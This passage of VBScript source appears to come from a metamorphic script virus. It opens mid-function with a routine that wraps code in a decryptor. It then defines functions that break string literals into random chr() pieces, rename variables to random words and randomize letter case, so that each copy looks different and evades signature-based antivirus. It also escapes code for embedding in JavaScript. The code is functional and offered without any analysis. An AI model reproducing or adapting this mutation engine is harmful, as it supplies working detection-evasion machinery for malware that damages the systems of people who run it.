"end if"&chr(10)
decrypt0r = string_morph(decrypt0r)
decrypt0r = replace(decrypt0r,"$ENCBODY$",""""&replace(replace(replace(inline,chr(34),chr(34)&chr(34)),chr(10),"""&chr(10)&"""),chr(13),"""&chr(13)&""")&"""")
decrypt0r = Metamorph(decrypt0r)
encrypt = decrypt0r
end function
function randomkeyxp()
randomize
numxp = 2+int(rnd*8)
for xp=0 to numxp
randomize
if(rnd<0.5 and xp>0)then
op="*"
else
op="+"
end if
randomize
num = 1+int(rnd*10)
randomkeyxp = randomkeyxp & op & num
next
end function
function string_morph(incode)
on error resume next
if(incode="")then exit function
STR_MORPH_RATIO=0.3
l=split(incode,chr(10))
for n=0 to ubound(l)
if(lcase(left(l(n),len("execute")))="execute")then n=n+1
newstring=""
repstring=""
binstring=false
for c=1 to len(l(n))
char=mid(l(n),c,1)
if(binstring)then
if(c<len(l(n)))then
if(char=chr(34))then
nextc=mid(l(n),c+1,1)
if(nextc<>chr(34))then
binstring=false
newstring=newstring&chr(34)
repstring=repstring&chr(34)
last=mid(l(n),c+1,len(l(n))-c)
if(instr(last,chr(34))=0)then
exit for
elseif(nextc=chr(38))then
midstr=left(last,instr(last,chr(34))-1)
if(right(midstr,1)=chr(38))then
newstring=newstring&midstr
repstring=repstring&midstr
end if
c=c+len(midstr)
end if
else
c=c+1
end if
end if
if(binstring)then
newstring=newstring&"%"&asc(char)
repstring=repstring&char
if(char=chr(34))then
repstring=repstring&chr(34)
end if
end if
else
if(char=chr(34))then
newstring=newstring&chr(34)
repstring=repstring&chr(34)
end if
exit for
end if
elseif(char=chr(34))then
binstring=true
newstring=newstring&chr(34)
repstring=repstring&chr(34)
end if
next
morphstring=chr(34)
binstring=false
for c=1 to len(newstring)-1
char=mid(newstring,c,1)
if(char=chr(34))then
binstring=not binstring
if(binstring)then
c=c+1
end if
end if
if(binstring)then
char=mid(newstring,c,1)
if(char="%")then
ascii=mid(newstring,c+1,3)
if(asc(right(ascii,1))<48 or asc(right(ascii,1))>57)then ascii=left(ascii,len(ascii)-1)
ascii=int(ascii)
randomize
if(rnd<STR_MORPH_RATIO)then
morphstring=morphstring&chr(34)&chr(38)&"chr("&ascii&")"&chr(38)&chr(34)
else
morphstring=morphstring&chr(ascii)
if(ascii=34)then
morphstring=morphstring&chr(34)
end if
end if
end if
if(char=chr(34))then
binstring=false
end if
end if
if(not binstring and c<len(newstring))then
midstr=mid(newstring,c+1,instr(mid(newstring,c+1,len(newstring)-c),chr(34))-1)
c=c+len(midstr)
parts=split(midstr,"&")
for m=1 to ubound(parts)-1
parts(m)=replace(parts(m)," ","")
if(len(parts(m))>4)then
flag=lcase(left(parts(m),4))
if(flag="chr(")then
piece=right(parts(m),len(parts(m))-4)
ac=left(piece,instr(piece,")")-1)
ac=int(ac)
morphstring=morphstring&chr(ac)
if(ac=34)then
morphstring=morphstring&chr(34)
end if
else
morphstring=morphstring&chr(34)&chr(38)&parts(m)&chr(38)&chr(34)
end if
end if
next
end if
next
morphstring=morphstring&chr(34)
l(n)=replace(l(n),repstring,morphstring)
next
incode=join(l,chr(10))
string_morph=incode
end function
function Metamorph(code)
on error resume next
Metamorph = code
if len(code) = 0 then exit function
forbiddenwords = " dim if then else elseif and or end wend select case each in is nothing set on error resume next function sub next while do loop for to not true false step rnd err msgbox wscript vbcrlf vbcancel vbexclamation vbyesno vbokcancel vbinformation vbcritical vbquestion vbno vbyes vbok exit execute randomize len right left replace split join asc chr hex dec me mod execute "
codelines = split(code,chr(10))
variables = ""
randomvariables = ""
for lindex=0 to ubound(codelines)
if(left(codelines(lindex),1) = "'") then codelines(lindex) = ""
bWritingVariable = false
bSearch = true
c = ""
newvar=""
offset = 0
codelines(lindex) = codelines(lindex) & " "
for cnum=1 to len(codelines(lindex))+1
if( not bWritingVariable )then lastc = c
c = right(left(codelines(lindex),cnum+offset),1)
if( c = "'" and bSearch )then exit for
if( c = """" and lcase(left(codelines(lindex),len("execute")))<>"execute" )then
bSearch = not bSearch
end if
if( ((asc(c) > 47 and asc(c) < 58) or c="_") and bWritingVariable )then
newvar=newvar & c
elseif( (asc(c) > 64 and asc(c) < 91) or (asc(c) > 96 and asc(c) < 123) )then
if ( bSearch ) then
bWritingVariable = true
newvar=newvar & c
end if
elseif( bWritingVariable )then
bWritingVariable = false
newvar = lcase(newvar)
bCanReplace = (lastc <> "." and (instr(lcase(forbiddenwords)," " & newvar & " ") = 0) and (c<>"(" or instr(lcase(code),"function " & newvar) > 0 or instr(lcase(code),"sub " & newvar) > 0 or instr(replace(lcase(code)," ",""),newvar & "=") > 0 or instr(replace(lcase(code)," ",""),"(" & newvar & ")") > 0))
if( bCanReplace ) then 
varlist = split(variables,";")
bFound = False
for pos=0 to ubound(varlist) step 2
if( varlist(pos) = newvar ) then
bFound = True
exit for
end if
next
if( not bFound ) then
do
rw = randomword(6,10)
loop while( instr(forbiddenwords,lcase(rw))>0 or instr(lcase(variables),lcase(rw))>0 or left(lcase(rw),1) = "h" )
if ( len(variables) = 0 )then
variables = newvar & ";" & rw
else
variables = variables & ";" & newvar & ";" & rw
end if
varlist=split(variables,";")
pos = ubound(varlist)-1
end if
codelines(lindex) = left(codelines(lindex),cnum+offset-len(newvar)-1) & varlist(pos+1) & right(codelines(lindex),len(codelines(lindex))-cnum-offset+1)
offset = offset+len(varlist(pos+1))-len(newvar)
else
oldnewvar=newvar
for ccc=1 to len(newvar)
cr=mid(newvar,ccc,1)
randomize
if(rnd<0.3)then
cr=UCase(cr)
else
cr=LCase(cr)
end if
newvar=left(newvar,ccc-1)&cr&right(newvar,len(newvar)-ccc)
next
codelines(lindex)=replace(codelines(lindex),oldnewvar,newvar)
end if
newvar = ""
end if
next
codelines(lindex) = left(codelines(lindex),len(codelines(lindex))-1)
next
code = join(codelines,chr(10))
if len(code) > 0 then Metamorph = code
end function
Function randomword(min,max)
on error resume next
if ( min > max ) then
mx = max
max = min
min = mx
end if
max = max+1
max = max-min
randomword=""
randomize
namelen = int(rnd*max)+min
for z=1 to namelen
randomize
g=int(rnd*2)+1
randomize
if g=0 then
c=chr(int(rnd*10)+48)
elseif g=1 then
c=chr(int(rnd*26)+65)
else
c=chr(int(rnd*26)+97)
end if
randomword=randomword & c
next
End Function
Function JSOneLine(sCode)
On Error Resume Next
sCode = replace(sCode,"\","\\")
sCode = replace(sCode,chr(10),"\n")
sCode = replace(sCode,chr(13),"\r")
sCode = replace(sCode,"""","\""")
End Function